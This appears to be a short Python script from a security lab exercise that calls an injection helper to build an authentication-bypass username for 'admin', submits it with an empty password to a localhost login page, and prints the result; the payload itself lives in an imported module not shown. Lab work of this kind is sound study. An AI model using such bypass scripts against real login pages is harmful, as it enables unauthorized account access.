#!/usr/bin/env python3

import inject

user = "admin"

user = inject.inject_bypass(user)

params = {
    "u": user,
    "p": ""
}

url = "http://localhost/lab09/login.php"

(response, url_par) = inject.send_request(params, url)

print(url_par)
print(response)
